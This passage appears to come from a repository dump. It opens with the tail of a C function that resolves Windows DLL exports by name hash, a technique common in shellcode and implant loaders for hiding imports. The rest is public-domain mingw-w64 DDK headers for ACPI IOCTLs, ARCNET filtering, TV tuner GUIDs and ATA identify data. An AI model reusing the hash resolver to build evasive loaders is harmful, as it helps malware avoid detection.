	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	/* Does an export table exist? */
	if ( Dir->VirtualAddress ) {
		/* Get offsets to names, funcs, ordinals */
		Exp = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );
		Aon = C_PTR( U_PTR( Dos ) + Exp->AddressOfNames );
		Aof = C_PTR( U_PTR( Dos ) + Exp->AddressOfFunctions );
		Aoo = C_PTR( U_PTR( Dos ) + Exp->AddressOfNameOrdinals );

		/* Enumerate all the exports */
		for ( INT Idx = 0 ; Idx < Exp->NumberOfNames ; ++Idx ) {
			/* Is this our export? */
			if ( HashString( C_PTR( U_PTR( Dos ) + Aon[ Idx ] ), 0 ) == ExportHash ) {
				/* Return pointer */
				return C_PTR( U_PTR( Dos ) + Aof[ Aoo[ Idx ] ] );
			};
		};
	};
	/* Abort! */
	return NULL;
};

```

`include/ddk/acpiioct.h`:

```h
#pragma once

#ifdef __cplusplus
extern "C" {
#endif

#define ACPI_EVAL_INPUT_BUFFER_SIGNATURE                    'BieA'
#define ACPI_EVAL_INPUT_BUFFER_SIMPLE_INTEGER_SIGNATURE     'IieA'
#define ACPI_EVAL_INPUT_BUFFER_SIMPLE_STRING_SIGNATURE      'SieA'
#define ACPI_EVAL_INPUT_BUFFER_COMPLEX_SIGNATURE            'CieA'
#define ACPI_EVAL_OUTPUT_BUFFER_SIGNATURE                   'BoeA'
#if (NTDDI_VERSION >= NTDDI_VISTA)
#define ACPI_EVAL_INPUT_BUFFER_SIGNATURE_EX                 'AieA'
#define ACPI_EVAL_INPUT_BUFFER_SIMPLE_INTEGER_SIGNATURE_EX  'DieA'
#define ACPI_EVAL_INPUT_BUFFER_SIMPLE_STRING_SIGNATURE_EX   'EieA'
#define ACPI_EVAL_INPUT_BUFFER_COMPLEX_SIGNATURE_EX         'FieA'
#define ACPI_ENUM_CHILDREN_OUTPUT_BUFFER_SIGNATURE          'GieA'
#define ACPI_ENUM_CHILDREN_INPUT_BUFFER_SIGNATURE           'HieA'
#endif

#define ACPI_METHOD_ARGUMENT_INTEGER                      0x0
#define ACPI_METHOD_ARGUMENT_STRING                       0x1
#define ACPI_METHOD_ARGUMENT_BUFFER                       0x2
#define ACPI_METHOD_ARGUMENT_PACKAGE                      0x3
#define ACPI_METHOD_ARGUMENT_PACKAGE_EX                   0x4

#define ACPI_ACQUIRE_GLOBAL_LOCK_SIGNATURE              'LgaA'
#define ACPI_RELEASE_GLOBAL_LOCK_SIGNATURE              'LgrA'

#define ACPI_OBJECT_HAS_CHILDREN            0x1

#define ENUM_CHILDREN_IMMEDIATE_ONLY        0x1
#define ENUM_CHILDREN_MULTILEVEL            0x2
#define ENUM_CHILDREN_NAME_IS_FILTER        0x4

typedef struct _ACPI_EVAL_INPUT_BUFFER {
  ULONG Signature;
  _ANONYMOUS_UNION union {
    UCHAR MethodName[4];
    ULONG MethodNameAsUlong;
  } DUMMYUNIONNAME;
} ACPI_EVAL_INPUT_BUFFER, *PACPI_EVAL_INPUT_BUFFER;

typedef struct _ACPI_EVAL_INPUT_BUFFER_SIMPLE_INTEGER {
  ULONG Signature;
  _ANONYMOUS_UNION union {
    UCHAR MethodName[4];
    ULONG MethodNameAsUlong;
  } DUMMYUNIONNAME;
  ULONG IntegerArgument;
} ACPI_EVAL_INPUT_BUFFER_SIMPLE_INTEGER, *PACPI_EVAL_INPUT_BUFFER_SIMPLE_INTEGER;

typedef struct _ACPI_EVAL_INPUT_BUFFER_SIMPLE_STRING {
  ULONG Signature;
  _ANONYMOUS_UNION union {
    UCHAR MethodName[4];
    ULONG MethodNameAsUlong;
  } DUMMYUNIONNAME;
  ULONG StringLength;
  UCHAR String[ANYSIZE_ARRAY];
} ACPI_EVAL_INPUT_BUFFER_SIMPLE_STRING, *PACPI_EVAL_INPUT_BUFFER_SIMPLE_STRING;

typedef struct _ACPI_METHOD_ARGUMENT {
  USHORT Type;
  USHORT DataLength;
  _ANONYMOUS_UNION union {
    ULONG Argument;
    UCHAR Data[ANYSIZE_ARRAY];
  } DUMMYUNIONNAME;
} ACPI_METHOD_ARGUMENT;
typedef ACPI_METHOD_ARGUMENT UNALIGNED *PACPI_METHOD_ARGUMENT;

typedef struct _ACPI_EVAL_INPUT_BUFFER_COMPLEX {
  ULONG Signature;
  _ANONYMOUS_UNION union {
    UCHAR MethodName[4];
    ULONG MethodNameAsUlong;
  } DUMMYUNIONNAME;
  ULONG Size;
  ULONG ArgumentCount;
  ACPI_METHOD_ARGUMENT Argument[ANYSIZE_ARRAY];
} ACPI_EVAL_INPUT_BUFFER_COMPLEX, *PACPI_EVAL_INPUT_BUFFER_COMPLEX;

typedef struct _ACPI_EVAL_OUTPUT_BUFFER {
  ULONG Signature;
  ULONG Length;
  ULONG Count;
  ACPI_METHOD_ARGUMENT Argument[ANYSIZE_ARRAY];
} ACPI_EVAL_OUTPUT_BUFFER;
typedef ACPI_EVAL_OUTPUT_BUFFER UNALIGNED *PACPI_EVAL_OUTPUT_BUFFER;

typedef struct _ACPI_MANIPULATE_GLOBAL_LOCK_BUFFER {
  ULONG Signature;
  PVOID LockObject;
} ACPI_MANIPULATE_GLOBAL_LOCK_BUFFER, *PACPI_MANIPULATE_GLOBAL_LOCK_BUFFER;

typedef struct _ACPI_EVAL_INPUT_BUFFER_EX {
  ULONG Signature;
  CHAR MethodName[256];
} ACPI_EVAL_INPUT_BUFFER_EX, *PACPI_EVAL_INPUT_BUFFER_EX;

typedef struct _ACPI_EVAL_INPUT_BUFFER_SIMPLE_INTEGER_EX {
  ULONG Signature;
  CHAR MethodName[256];
  ULONG64 IntegerArgument;
} ACPI_EVAL_INPUT_BUFFER_SIMPLE_INTEGER_EX, *PACPI_EVAL_INPUT_BUFFER_SIMPLE_INTEGER_EX;

typedef struct _ACPI_EVAL_INPUT_BUFFER_SIMPLE_STRING_EX {
  ULONG Signature;
  CHAR MethodName[256];
  ULONG StringLength;
  UCHAR String[ANYSIZE_ARRAY];
} ACPI_EVAL_INPUT_BUFFER_SIMPLE_STRING_EX, *PACPI_EVAL_INPUT_BUFFER_SIMPLE_STRING_EX;

typedef struct _ACPI_EVAL_INPUT_BUFFER_COMPLEX_EX {
  ULONG Signature;
  CHAR MethodName[256];
  ULONG Size;
  ULONG ArgumentCount;
  ACPI_METHOD_ARGUMENT Argument[ANYSIZE_ARRAY];
} ACPI_EVAL_INPUT_BUFFER_COMPLEX_EX, *PACPI_EVAL_INPUT_BUFFER_COMPLEX_EX;

typedef struct _ACPI_ENUM_CHILDREN_INPUT_BUFFER {
  ULONG Signature;
  ULONG Flags;
  ULONG NameLength;
  CHAR Name[ANYSIZE_ARRAY];
} ACPI_ENUM_CHILDREN_INPUT_BUFFER, *PACPI_ENUM_CHILDREN_INPUT_BUFFER;

typedef struct _ACPI_ENUM_CHILD {
  ULONG Flags;
  ULONG NameLength;
  CHAR Name[ANYSIZE_ARRAY];
} ACPI_ENUM_CHILD;
typedef ACPI_ENUM_CHILD UNALIGNED *PACPI_ENUM_CHILD;

typedef struct _ACPI_ENUM_CHILDREN_OUTPUT_BUFFER {
  ULONG Signature;
  ULONG NumberOfChildren;
  ACPI_ENUM_CHILD Children[ANYSIZE_ARRAY];
} ACPI_ENUM_CHILDREN_OUTPUT_BUFFER; 
typedef ACPI_ENUM_CHILDREN_OUTPUT_BUFFER UNALIGNED *PACPI_ENUM_CHILDREN_OUTPUT_BUFFER;

#define ACPI_METHOD_ARGUMENT_LENGTH( DataLength )                           \
    (FIELD_OFFSET(ACPI_METHOD_ARGUMENT, Data) + max(sizeof(ULONG), DataLength))

#define ACPI_METHOD_ARGUMENT_LENGTH_FROM_ARGUMENT( Argument )               \
    (ACPI_METHOD_ARGUMENT_LENGTH(((PACPI_METHOD_ARGUMENT)Argument)->DataLength))

#define ACPI_METHOD_NEXT_ARGUMENT( Argument )                               \
    (PACPI_METHOD_ARGUMENT) ( (PUCHAR) Argument +                           \
    ACPI_METHOD_ARGUMENT_LENGTH_FROM_ARGUMENT( Argument ) )


#define ACPI_METHOD_SET_ARGUMENT_INTEGER( MethodArgument, IntData )         \
    { MethodArgument->Type = ACPI_METHOD_ARGUMENT_INTEGER;                  \
      MethodArgument->DataLength = sizeof(ULONG);                           \
      MethodArgument->Argument = IntData; }

#define ACPI_METHOD_SET_ARGUMENT_STRING( Argument, StrData )                \
    { Argument->Type = ACPI_METHOD_ARGUMENT_STRING;                         \
      Argument->DataLength = strlen((PCHAR)StrData) + sizeof(UCHAR);       \
      RtlCopyMemory(&Argument->Data[0],(PUCHAR)StrData,Argument->DataLength); }

#define ACPI_METHOD_SET_ARGUMENT_BUFFER( Argument, BuffData, BuffLength )   \
    { Argument->Type = ACPI_METHOD_ARGUMENT_BUFFER;                         \
      Argument->DataLength = BuffLength;                                    \
      RtlCopyMemory(&Argument->Data[0],(PUCHAR)BuffData,Argument->DataLength); }

#define ACPI_ENUM_CHILD_LENGTH_FROM_CHILD( Child )              \
    ( (2* sizeof (ULONG)) + Child->NameLength )

#define ACPI_ENUM_CHILD_NEXT( Child )                           \
    (PACPI_ENUM_CHILD) ( (PUCHAR) Child +                       \
    ACPI_ENUM_CHILD_LENGTH_FROM_CHILD( Child ) )

#define IOCTL_ACPI_ASYNC_EVAL_METHOD             CTL_CODE(FILE_DEVICE_ACPI, 0, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_ACPI_EVAL_METHOD                   CTL_CODE(FILE_DEVICE_ACPI, 1, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_ACPI_ACQUIRE_GLOBAL_LOCK           CTL_CODE(FILE_DEVICE_ACPI, 4, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_ACPI_RELEASE_GLOBAL_LOCK           CTL_CODE(FILE_DEVICE_ACPI, 5, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#if (NTDDI_VERSION >= NTDDI_VISTA)
#define IOCTL_ACPI_EVAL_METHOD_EX                CTL_CODE(FILE_DEVICE_ACPI, 6, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_ACPI_ASYNC_EVAL_METHOD_EX          CTL_CODE(FILE_DEVICE_ACPI, 7, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_ACPI_ENUM_CHILDREN                 CTL_CODE(FILE_DEVICE_ACPI, 8, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#endif

#ifdef __cplusplus
}
#endif

```

`include/ddk/afilter.h`:

```h
/*
 * afilter.h
 *
 * Address filtering for NDIS MACs
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Filip Navara <xnavara@volny.cz>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef _ARC_FILTER_DEFS_
#define _ARC_FILTER_DEFS_

#ifdef __cplusplus
extern "C" {
#endif

#define ARC_RECEIVE_BUFFERS            64
#define ARCNET_ADDRESS_LEN             1
#define ARC_PROTOCOL_HEADER_SIZE       (sizeof(ARC_PROTOCOL_HEADER))
#define ARC_MAX_FRAME_SIZE             504
#define ARC_MAX_ADDRESS_IDS            256
#define ARC_MAX_FRAME_HEADER_SIZE      6
#define ARC_MAX_PACKET_SIZE            576
#define ARC_FILTER_MAX_OPENS           (sizeof(ULONG) * 8)

#define ARC_IS_BROADCAST(Address) (BOOLEAN)(!(Address))

#define ARC_QUERY_FILTER_CLASSES(Filter) ((Filter)->CombinedPacketFilter)
#define ARC_QUERY_PACKET_FILTER(Filter, NdisFilterHandle) \
        (((PARC_BINDING_INFO)(NdisFilterHandle))->PacketFilters)

typedef ULONG MASK, *PMASK;

typedef struct _ARC_BUFFER_LIST
{
  PVOID  Buffer;
  UINT  Size;
  UINT  BytesLeft;
  struct _ARC_BUFFER_LIST  *Next;
} ARC_BUFFER_LIST, *PARC_BUFFER_LIST;

typedef struct _ARC_PROTOCOL_HEADER
{
  UCHAR  SourceId[ARCNET_ADDRESS_LEN];
  UCHAR  DestId[ARCNET_ADDRESS_LEN];
  UCHAR  ProtId;
} ARC_PROTOCOL_HEADER, *PARC_PROTOCOL_HEADER;

typedef struct _ARC_PACKET_HEADER
{
  ARC_PROTOCOL_HEADER  ProtHeader;
  USHORT  FrameSequence;
  UCHAR  SplitFlag;
  UCHAR  LastSplitFlag;
  UCHAR  FramesReceived;
} ARC_PACKET_HEADER, *PARC_PACKET_HEADER;

typedef struct _ARC_PACKET
{
  ARC_PACKET_HEADER  Header;
  struct _ARC_PACKET  *Next;
  ULONG  TotalLength;
  BOOLEAN  LastFrame;
  PARC_BUFFER_LIST  FirstBuffer;
  PARC_BUFFER_LIST  LastBuffer;
  NDIS_PACKET  TmpNdisPacket;
} ARC_PACKET, *PARC_PACKET;

typedef struct _ARC_BINDING_INFO
{
  PNDIS_OPEN_BLOCK  NdisBindingHandle;
  PVOID  Reserved;
  UINT  PacketFilters;
  ULONG  References;
  struct _ARC_BINDING_INFO  *NextOpen;
  BOOLEAN  ReceivedAPacket;
  UINT  OldPacketFilters;
} ARC_BINDING_INFO,*PARC_BINDING_INFO;

typedef struct _ARC_FILTER
{
  struct _NDIS_MINIPORT_BLOCK  *Miniport;
  UINT  CombinedPacketFilter;
  PARC_BINDING_INFO  OpenList;
  NDIS_HANDLE  ReceiveBufferPool;
  PARC_BUFFER_LIST  FreeBufferList;
  PARC_PACKET  FreePackets;
  PARC_PACKET  OutstandingPackets;
  UCHAR  AdapterAddress;
  UINT  OldCombinedPacketFilter;
} ARC_FILTER,*PARC_FILTER;

BOOLEAN
NTAPI
ArcCreateFilter(
  IN struct _NDIS_MINIPORT_BLOCK  *Miniport,
  IN UCHAR  AdapterAddress,
  OUT PARC_FILTER  *Filter);

VOID
NTAPI
ArcDeleteFilter(
  IN PARC_FILTER Filter);

BOOLEAN
NTAPI
ArcNoteFilterOpenAdapter(
  IN PARC_FILTER  Filter,
  IN NDIS_HANDLE  NdisBindingHandle,
  OUT PNDIS_HANDLE  NdisFilterHandle);

NDIS_STATUS
NTAPI
ArcDeleteFilterOpenAdapter(
  IN PARC_FILTER  Filter,
  IN NDIS_HANDLE  NdisFilterHandle,
  IN PNDIS_REQUEST  NdisRequest);

NDIS_STATUS
NTAPI
ArcFilterAdjust(
  IN PARC_FILTER  Filter,
  IN NDIS_HANDLE  NdisFilterHandle,
  IN PNDIS_REQUEST  NdisRequest,
  IN UINT  FilterClasses,
  IN BOOLEAN  Set);

VOID
NTAPI
ArcFilterDprIndicateReceiveComplete(
  IN PARC_FILTER  Filter);

VOID
NTAPI
ArcFilterDprIndicateReceive(
  IN PARC_FILTER  Filter,
  IN PUCHAR  pRawHeader,
  IN PUCHAR  pData,
  IN UINT  Length);

NDIS_STATUS
NTAPI
ArcFilterTransferData(
  IN PARC_FILTER  Filter,
  IN NDIS_HANDLE  MacReceiveContext,
  IN UINT  ByteOffset,
  IN UINT  BytesToTransfer,
  OUT PNDIS_PACKET  Packet,
  OUT PUINT  BytesTransfered);

VOID
NTAPI
ArcFreeNdisPacket(
  IN PARC_PACKET  Packet);

VOID
NTAPI
ArcFilterDoIndication(
  IN PARC_FILTER  Filter,
  IN PARC_PACKET  Packet);

VOID
NTAPI
ArcDestroyPacket(
  IN PARC_FILTER  Filter,
  IN PARC_PACKET  Packet);

#ifdef __cplusplus
}
#endif

#endif /* _ARC_FILTER_DEFS_ */

```

`include/ddk/amtvuids.h`:

```h

#ifndef OUR_GUID_ENTRY
#define OUR_GUID_ENTRY(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8);
#endif

OUR_GUID_ENTRY(CLSID_CTVTunerFilter,             0x266EEE40, 0x6C63, 0x11CF, 0x8A, 0x3, 0x0, 0xAA, 0x0, 0x6E, 0xCB, 0x65);
OUR_GUID_ENTRY(CLSID_CTVTunerFilterPropertyPage, 0x266EEE41, 0x6C63, 0x11CF, 0x8A, 0x3, 0x0, 0xAA, 0x0, 0x6E, 0xCB, 0x65);
OUR_GUID_ENTRY(IID_AnalogVideoStandard,          0x266EEE44, 0x6C63, 0x11CF, 0x8A, 0x3, 0x0, 0xAA, 0x0, 0x6E, 0xCB, 0x65);
OUR_GUID_ENTRY(IID_TunerInputType,               0x266EEE46, 0x6C63, 0x11CF, 0x8A, 0x3, 0x0, 0xAA, 0x0, 0x6E, 0xCB, 0x65);
OUR_GUID_ENTRY(CLSID_CrossbarFilter,             0x71F96460, 0x78F3, 0x11D0, 0xA1, 0x8C, 0x0, 0xA0, 0xC9, 0x11, 0x89, 0x56);
OUR_GUID_ENTRY(CLSID_CrossbarFilterPropertyPage, 0x71F96461, 0x78F3, 0x11D0, 0xA1, 0x8C, 0x0, 0xA0, 0xC9, 0x11, 0x89, 0x56);
OUR_GUID_ENTRY(CLSID_TVAudioFilter,              0x71F96462, 0x78F3, 0x11D0, 0xA1, 0x8C, 0x0, 0xA0, 0xC9, 0x11, 0x89, 0x56);
OUR_GUID_ENTRY(CLSID_TVAudioFilterPropertyPage,  0x71F96463, 0x78F3, 0x11D0, 0xA1, 0x8C, 0x0, 0xA0, 0xC9, 0x11, 0x89, 0x56);


```

`include/ddk/ata.h`:

```h
/**
 * This file has no copyright assigned and is placed in the Public Domain.
 * This file is part of the mingw-w64 runtime package.
 * No warranty is given; refer to the file DISCLAIMER.PD within this package.
 */

#ifndef _NTATA_
#define _NTATA_

#pragma pack(push,1)

typedef struct _IDENTIFY_DEVICE_DATA {
  struct {
    USHORT Reserved1 : 1;
    USHORT Retired3 : 1;
    USHORT ResponseIncomplete : 1;
    USHORT Retired2 : 3;
    USHORT FixedDevice : 1;
    USHORT RemovableMedia : 1;
    USHORT Retired1 : 7;
    USHORT DeviceType : 1;
  } GeneralConfiguration;
  USHORT NumCylinders;
  USHORT SpecificConfiguration;
  USHORT NumHeads;
  USHORT Retired1[2];
  USHORT NumSectorsPerTrack;
  USHORT VendorUnique1[3];
  UCHAR SerialNumber[20];
  USHORT Retired2[2];
  USHORT Obsolete1;
  UCHAR FirmwareRevision[8];
  UCHAR ModelNumber[40];
  UCHAR MaximumBlockTransfer;
  UCHAR VendorUnique2;
  struct {
    USHORT FeatureSupported : 1;
    USHORT Reserved : 15;
  } TrustedComputing;
  struct {
    UCHAR CurrentLongPhysicalSectorAlignment : 2;
    UCHAR ReservedByte49 : 6;
    UCHAR DmaSupported : 1;
    UCHAR LbaSupported : 1;
    UCHAR IordyDisable : 1;
    UCHAR IordySupported : 1;
    UCHAR Reserved1 : 1;
    UCHAR StandybyTimerSupport : 1;
    UCHAR Reserved2 : 2;
    USHORT ReservedWord50;
  } Capabilities;
  USHORT ObsoleteWords51[2];
  USHORT TranslationFieldsValid : 3;
  USHORT Reserved3 : 5;
  USHORT FreeFallControlSensitivity : 8;
  USHORT NumberOfCurrentCylinders;
  USHORT NumberOfCurrentHeads;
  USHORT CurrentSectorsPerTrack;
  ULONG CurrentSectorCapacity;
  UCHAR CurrentMultiSectorSetting;
  UCHAR MultiSectorSettingValid : 1;
  UCHAR ReservedByte59 : 3;
  UCHAR SanitizeFeatureSupported : 1;
  UCHAR CryptoScrambleExtCommandSupported : 1;
  UCHAR OverwriteExtCommandSupported : 1;
  UCHAR BlockEraseExtCommandSupported : 1;
  ULONG UserAddressableSectors;
  USHORT ObsoleteWord62;
  USHORT MultiWordDMASupport : 8;
  USHORT MultiWordDMAActive : 8;
  USHORT AdvancedPIOModes : 8;
  USHORT ReservedByte64 : 8;
  USHORT MinimumMWXferCycleTime;
  USHORT RecommendedMWXferCycleTime;
  USHORT MinimumPIOCycleTime;
  USHORT MinimumPIOCycleTimeIORDY;
  struct {
    USHORT ZonedCapabilities : 2;
    USHORT NonVolatileWriteCache : 1;
    USHORT ExtendedUserAddressableSectorsSupported : 1;
    USHORT DeviceEncryptsAllUserData : 1;
    USHORT ReadZeroAfterTrimSupported : 1;
    USHORT Optional28BitCommandsSupported : 1;
    USHORT IEEE1667 : 1;
    USHORT DownloadMicrocodeDmaSupported : 1;
    USHORT SetMaxSetPasswordUnlockDmaSupported : 1;
    USHORT WriteBufferDmaSupported : 1;
    USHORT ReadBufferDmaSupported : 1;
    USHORT DeviceConfigIdentifySetDmaSupported : 1;
    USHORT LPSAERCSupported : 1;
    USHORT DeterministicReadAfterTrimSupported : 1;
    USHORT CFastSpecSupported : 1;
  } AdditionalSupported;
  USHORT ReservedWords70[5];
  USHORT QueueDepth : 5;
  USHORT ReservedWord75 : 11;
  struct {
    USHORT Reserved0 : 1;
    USHORT SataGen1 : 1;
    USHORT SataGen2 : 1;
    USHORT SataGen3 : 1;
    USHORT Reserved1 : 4;
    USHORT NCQ : 1;
    USHORT HIPM : 1;
    USHORT PhyEvents : 1;
    USHORT NcqUnload : 1;
    USHORT NcqPriority : 1;
    USHORT HostAutoPS : 1;
    USHORT DeviceAutoPS : 1;
    USHORT ReadLogDMA : 1;
    USHORT Reserved2 : 1;
    USHORT CurrentSpeed : 3;
    USHORT NcqStreaming : 1;
    USHORT NcqQueueMgmt : 1;
    USHORT NcqReceiveSend : 1;
    USHORT DEVSLPtoReducedPwrState : 1;
    USHORT Reserved3 : 8;
  } SerialAtaCapabilities;
  struct {
    USHORT Reserved0 : 1;
    USHORT NonZeroOffsets : 1;
    USHORT DmaSetupAutoActivate : 1;
    USHORT DIPM : 1;
    USHORT InOrderData : 1;
    USHORT HardwareFeatureControl : 1;
    USHORT SoftwareSettingsPreservation : 1;
    USHORT NCQAutosense : 1;
    USHORT DEVSLP : 1;
    USHORT HybridInformation : 1;
    USHORT Reserved1 : 6;
  } SerialAtaFeaturesSupported;
  struct {
    USHORT Reserved0 : 1;
    USHORT NonZeroOffsets : 1;
    USHORT DmaSetupAutoActivate : 1;
    USHORT DIPM : 1;
    USHORT InOrderData : 1;
    USHORT HardwareFeatureControl : 1;
    USHORT SoftwareSettingsPreservation : 1;
    USHORT DeviceAutoPS : 1;
    USHORT DEVSLP : 1;
    USHORT HybridInformation : 1;
    USHORT Reserved1 : 6;
  } SerialAtaFeaturesEnabled;
  USHORT MajorRevision;
  USHORT MinorRevision;
  struct {
    USHORT SmartCommands : 1;
    USHORT SecurityMode : 1;
    USHORT RemovableMediaFeature : 1;
    USHORT PowerManagement : 1;
    USHORT Reserved1 : 1;
    USHORT WriteCache : 1;
    USHORT LookAhead : 1;
    USHORT ReleaseInterrupt : 1;
    USHORT ServiceInterrupt : 1;
    USHORT DeviceReset : 1;
    USHORT HostProtectedArea : 1;
    USHORT Obsolete1 : 1;
    USHORT WriteBuffer : 1;
    USHORT ReadBuffer : 1;
    USHORT Nop : 1;
    USHORT Obsolete2 : 1;
    USHORT DownloadMicrocode : 1;
    USHORT DmaQueued : 1;
    USHORT Cfa : 1;
    USHORT AdvancedPm : 1;
    USHORT Msn : 1;
    USHORT PowerUpInStandby : 1;
    USHORT ManualPowerUp : 1;
    USHORT Reserved2 : 1;
    USHORT SetMax : 1;
    USHORT Acoustics : 1;
    USHORT BigLba : 1;
    USHORT DeviceConfigOverlay : 1;
    USHORT FlushCache : 1;
    USHORT FlushCacheExt : 1;
    USHORT WordValid83 : 2;
    USHORT SmartErrorLog : 1;
    USHORT SmartSelfTest : 1;
    USHORT MediaSerialNumber : 1;
    USHORT MediaCardPassThrough : 1;
    USHORT StreamingFeature : 1;
    USHORT GpLogging : 1;
    USHORT WriteFua : 1;
    USHORT WriteQueuedFua : 1;
    USHORT WWN64Bit : 1;
    USHORT URGReadStream : 1;
    USHORT URGWriteStream : 1;
    USHORT ReservedForTechReport : 2;
    USHORT IdleWithUnloadFeature : 1;
    USHORT WordValid : 2;
  } CommandSetSupport;
  struct {
    USHORT SmartCommands : 1;
    USHORT SecurityMode : 1;
    USHORT RemovableMediaFeature : 1;
    USHORT PowerManagement : 1;
    USHORT Reserved1 : 1;
    USHORT WriteCache : 1;
    USHORT LookAhead : 1;
    USHORT ReleaseInterrupt : 1;
    USHORT ServiceInterrupt : 1;
    USHORT DeviceReset : 1;
    USHORT HostProtectedArea : 1;
    USHORT Obsolete1 : 1;
    USHORT WriteBuffer : 1;
    USHORT ReadBuffer : 1;
    USHORT Nop : 1;
    USHORT Obsolete2 : 1;
    USHORT DownloadMicrocode : 1;
    USHORT DmaQueued : 1;
    USHORT Cfa : 1;
    USHORT AdvancedPm : 1;
    USHORT Msn : 1;
    USHORT PowerUpInStandby : 1;
    USHORT ManualPowerUp : 1;
    USHORT Reserved2 : 1;
    USHORT SetMax : 1;
    USHORT Acoustics : 1;
    USHORT BigLba : 1;
    USHORT DeviceConfigOverlay : 1;
    USHORT FlushCache : 1;
    USHORT FlushCacheExt : 1;
    USHORT Resrved3 : 1;
    USHORT Words119_120Valid : 1;
    USHORT SmartErrorLog : 1;
    USHORT SmartSelfTest : 1;
    USHORT MediaSerialNumber : 1;
    USHORT MediaCardPassThrough : 1;
    USHORT StreamingFeature : 1;
    USHORT GpLogging : 1;
    USHORT WriteFua : 1;
    USHORT WriteQueuedFua : 1;
    USHORT WWN64Bit : 1;
    USHORT URGReadStream : 1;
    USHORT URGWriteStream : 1;
    USHORT ReservedForTechReport : 2;
    USHORT IdleWithUnloadFeature : 1;
    USHORT Reserved4 : 2;
  } CommandSetActive;
  USHORT UltraDMASupport : 8;
  USHORT UltraDMAActive : 8;
  struct {
    USHORT TimeRequired : 15;
    USHORT ExtendedTimeReported : 1;
  } NormalSecurityEraseUnit;
  struct {
    USHORT TimeRequired : 15;
    USHORT ExtendedTimeReported : 1;
  } EnhancedSecurityEraseUnit;
  USHORT CurrentAPMLevel : 8;
  USHORT ReservedWord91 : 8;
  USHORT MasterPasswordID;
  USHORT HardwareResetResult;
  USHORT CurrentAcousticValue : 8;
  USHORT RecommendedAcousticValue : 8;
  USHORT StreamMinRequestSize;
  USHORT StreamingTransferTimeDMA;
  USHORT StreamingAccessLatencyDMAPIO;
  ULONG StreamingPerfGranularity;
  ULONG Max48BitLBA[2];
  USHORT StreamingTransferTime;
  USHORT DsmCap;
  struct {
    USHORT LogicalSectorsPerPhysicalSector : 4;
    USHORT Reserved0 : 8;
    USHORT LogicalSectorLongerThan256Words : 1;
    USHORT MultipleLogicalSectorsPerPhysicalSector : 1;
    USHORT Reserved1 : 2;
  } PhysicalLogicalSectorSize;
  USHORT InterSeekDelay;
  USHORT WorldWideName[4];
  USHORT ReservedForWorldWideName128[4];
  USHORT ReservedForTlcTechnicalReport;
  USHORT WordsPerLogicalSector[2];
  struct {
    USHORT ReservedForDrqTechnicalReport : 1;
    USHORT WriteReadVerify : 1;
    USHORT WriteUncorrectableExt : 1;
    USHORT ReadWriteLogDmaExt : 1;
    USHORT DownloadMicrocodeMode3 : 1;
    USHORT FreefallControl : 1;
    USHORT SenseDataReporting : 1;
    USHORT ExtendedPowerConditions : 1;
    USHORT Reserved0 : 6;
    USHORT WordValid : 2;
  } CommandSetSupportExt;
  struct {
    USHORT ReservedForDrqTechnicalReport : 1;
    USHORT WriteReadVerify : 1;
    USHORT WriteUncorrectableExt : 1;
    USHORT ReadWriteLogDmaExt : 1;
    USHORT DownloadMicrocodeMode3 : 1;
    USHORT FreefallControl : 1;
    USHORT SenseDataReporting : 1;
    USHORT ExtendedPowerConditions : 1;
    USHORT Reserved0 : 6;
    USHORT Reserved1 : 2;
  } CommandSetActiveExt;
  USHORT ReservedForExpandedSupportandActive[6];
  USHORT MsnSupport : 2;
  USHORT ReservedWord127 : 14;
  struct {
    USHORT SecuritySupported : 1;
    USHORT SecurityEnabled : 1;
    USHORT SecurityLocked : 1;
    USHORT SecurityFrozen : 1;
    USHORT SecurityCountExpired : 1;
    USHORT EnhancedSecurityEraseSupported : 1;
    USHORT Reserved0 : 2;
    USHORT SecurityLevel : 1;
    USHORT Reserved1 : 7;
  } SecurityStatus;
  USHORT ReservedWord129[31];
  struct {
    USHORT MaximumCurrentInMA : 12;
    USHORT CfaPowerMode1Disabled : 1;
    USHORT CfaPowerMode1Required : 1;
    USHORT Reserved0 : 1;
    USHORT Word160Supported : 1;
  } CfaPowerMode1;
  USHORT ReservedForCfaWord161[7];
  USHORT NominalFormFactor : 4;
  USHORT ReservedWord168 : 12;
  struct {
    USHORT SupportsTrim : 1;
    USHORT Reserved0 : 15;
  } DataSetManagementFeature;
  USHORT AdditionalProductID[4];
  USHORT ReservedForCfaWord174[2];
  USHORT CurrentMediaSerialNumber[30];
  struct {
    USHORT Supported : 1;
    USHORT Reserved0 : 1;
    USHORT WriteSameSuported : 1;
    USHORT ErrorRecoveryControlSupported : 1;
    USHORT FeatureControlSuported : 1;
    USHORT DataTablesSuported : 1;
    USHORT Reserved1 : 6;
    USHORT VendorSpecific : 4;
  } SCTCommandTransport;
  USHORT ReservedWord207[2];
  struct {
    USHORT AlignmentOfLogicalWithinPhysical : 14;
    USHORT Word209Supported : 1;
    USHORT Reserved0 : 1;
  } BlockAlignment;
  USHORT WriteReadVerifySectorCountMode3Only[2];
  USHORT WriteReadVerifySectorCountMode2Only[2];
  struct {
    USHORT NVCachePowerModeEnabled : 1;
    USHORT Reserved0 : 3;
